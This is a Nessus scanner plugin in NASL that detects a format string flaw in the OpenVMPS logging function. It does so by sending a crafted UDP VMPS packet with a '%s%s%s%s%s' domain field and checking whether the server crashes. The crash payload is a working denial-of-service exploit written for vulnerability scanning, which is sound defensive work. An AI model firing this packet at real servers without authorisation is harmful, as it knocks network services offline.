#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20067);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2005-4714");
  script_bugtraq_id(15072);
  script_osvdb_id(19910);

  script_name(english:"OpenVMPS Logging Function Format String");
  script_summary(english:"Checks for a format string vulnerability in OpenVMPS' logging");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a service that is affected by a format
string vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running OpenVMPS, an open source VLAN
Management Policy Server (VMPS). 

There is a format string vulnerability in versions of OpenVMPS up to
and including 1.3 that may allow remote attackers to crash the server
or execute code on the affected host subject to the privileges under
which the server operates, possibly root." );
 script_set_attribute(attribute:"solution", value:
"Use a firewall to filter access to the affected port." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/10/20");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/10/10");
 script_cvs_date("$Date: 2013/01/11 23:05:34 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:openvmps:openvmps");
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2005-2013 Tenable Network Security, Inc.");

  script_require_ports("Services/vmps", 1589);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");


port = get_service(svc:"vmps", default: 1589, ipproto: "udp");
if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");

# Use a random domain to ensure we get a "WRONG DOMAIN" response.
domain = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_", length:10);
# Use a random sequence number to verify the response packet.
seq = rand_str(length:4);
# A request to join a port.
req = raw_string(
  0x01, 0x01, 0x00, 0x06, seq,

  0x00, 0x00, 0x0c, 0x01, 0x00, 0x04, 0x7f, 0x00, 0x00, 0x01,
  0x00, 0x00, 0x0c, 0x02, 0x00, 0x06, "nessus",
  0x00, 0x00, 0x0c, 0x03, 0x00, strlen(SCRIPT_NAME), SCRIPT_NAME,
  0x00, 0x00, 0x0c, 0x04, 0x00, strlen(domain), domain,
  0x00, 0x00, 0x0c, 0x07, 0x00, 0x01, 0x00,
  0x00, 0x00, 0x0c, 0x06, 0x00, 0x06, 0x12, 0x34, 0x12, 0x34, 0x12, 0x34
);


# Try a couple of times to get a response out of the server.
for (iter1 = 0; iter1 < 5; iter1++) {
  soc = open_sock_udp(port);
  if (!soc) exit(0);

  # Make sure the server's up by sending a request to join a port.
  send(socket:soc, data:req);

  # Read the response.
  res = recv(socket:soc, length:16);
  if (isnull(res)) exit(0);

  # If it looks like it's up...
  if (
    ord(res[0]) == 1 &&
    ord(res[1]) == 2 &&
    ord(res[2]) == 5 &&
    substr(res, 4, 7) == seq
  ) {
    # Craft a malicious packet to exploit the flaw.
    req2 = str_replace(
      string:req, 
      find:domain,
      replace:"%s%s%s%s%s"
    );

    # Try a couple of times to crash the server.
    for (iter2 = 0; iter2 < 5; iter2++) {
      soc = open_sock_udp(port);
      if (!soc) exit(0);

      send(socket:soc, data:req2);

      # Read the response.
      res = recv(socket:soc, length:16);

      # If there was no response, check again to make sure it's down.
      if (isnull(res)) {
        for (iter3 = 0; iter3 < 5; iter3++) {
          soc = open_sock_udp(port);
          #if (!soc) exit(0);

          # Make sure the server's up by sending a valid request.
          send(socket:soc, data:req);

          # Read the response.
          res = recv(socket:soc, length:16);

          # There's a problem if we no longer get a response to a valid request.
          if (isnull(res)) {
            security_hole(port:port, protocol:"udp");
            exit(0);
          }
        }
      }
    }

    # We're done if the server responded.
    break;
  }
}
